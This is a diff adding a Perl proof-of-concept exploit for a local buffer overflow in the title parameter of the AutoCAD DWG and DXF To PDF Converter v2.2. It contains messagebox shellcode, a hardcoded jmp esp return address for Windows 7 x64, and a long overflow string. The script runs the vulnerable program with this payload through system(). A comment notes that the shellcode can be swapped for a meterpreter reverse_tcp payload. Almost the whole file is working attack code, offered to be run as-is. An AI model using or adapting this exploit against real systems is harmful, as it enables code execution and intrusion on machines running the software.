@@ -1,0 +1,48 @@
+#*************************************************************************************************************
+# 
+# Exploit Title: AutoCAD DWG and DXF To PDF Converter v2.2 Buffer Overflow
+# Date: 9-5-2015
+# Software Link: http://www.verypdf.com/autocad-dwg-dxf-to-pdf/dwg_dxf_to_pdf_setup.exe
+# Exploit Author: Robbie Corley
+# Contact: c0d3rc0rl3y@gmail.com
+# Website: 
+# CVE: 
+# Category: Local Exploit
+#
+# Description:
+# The title parameter passed into the program that specifies the title of the converted PDF is vulnerable to a buffer overflow.  
+# This can be exploited using EIP direct overwrite, SEH bypass, and ROP.
+# EIP was easier and afforded more universal exploitation so I went that route after SEH bypass limited the exploit's universal OS compatibility 
+# Enjoy!  (Proofs included)
+#
+# Instructions:  Run this as-is (if on x64 platform) and hit the [try] button when the program opens.
+# 
+#**************************************************************************************************************
+
+#standard messagebox shellcode.  
+#Adapts readily to windows/meterpreter/reverse_tcp using msfvenom --smallest
+
+my $shellcode =
+"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42".
+"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03".
+"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b".
+"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e".
+"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c".
+"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74".
+"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe".
+"\x49\x0b\x31\xc0\x51\x50\xff\xd7";
+
+open(myfile,'>crasher.dwf'); #generate the dummy DWF file
+print myfile "yattayattayatta"; #gibberish to go in file
+close (myfile); #close the file
+
+$sploit=pack('V',0x100126db); #jmp esp specific to Windows 7 x64 [found within the packed section of the executable :) ]
+
+$cmd='"C:\\Program Files (x86)\\AutoCAD DWG and DXF To PDF Converter v2.2\\dwg2pdf.exe"'; #change this if you are on a 32-bit based processor
+$cmd .= ' -t "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAargvbhewthvboiwetuhnvoehntoeqothnogobtehnvohjnoeqhngovenhjotgvnoehnogveoqnvobeqntgoh2io4gh894gh942h9gth249h92hg49h2g9h429gh4g9h429hg9th4g9h489gh849hg894h982hg984hg98h4298hg9842hg8942hg8942h298hg4298hg8942hg894hg9hg398gh78358h35g3h8352g8h32h5g8v3ig25bgb3958v938g983h98g3h9gh3259hg3529gh93vbh98v893hg89h5329g8h3598gth93vb583gfb9358fb929b3g29b8g25389bg2538b9g5238b952g38bg925gb28958b925v89bcc88r2cxnbx2rnb982c552b89c25vb8725vg852v8528g52g8258787g5g87253g8723487gfc32g87c23g78c23g78cg387cg7823c2g837cg738cg7853S25hg532gfh3295g8h83295gtf352tu539t8u3529tg5938gt932ut235yt9235yt98325yt92358yv8935vy8953vy5239vy293v8y352v98y32895vy9352yv932yv9y329vy239vy9325y298fy92358fy9253fn53ngj25ngn53n53ngln235lgn2l35ngl235ng3ljnghln3hg239hbu390gu23905ug935guy92835ut893ug9u39gvu935ugvb8953u938ug9835y2395fy2398fy9325fy9325yf932yf9y2359f2359fy2395vy598vy5392vy2395vy3295yv9358yv39258vy9238yv9235hgt9h23g59h23';
+
+$cmd .= $sploit;
+$cmd .= $shellcode;
+$cmd .= '" -i crasher.dwf -o test.pdf'; # append our arguments to the end
+
+system($cmd);
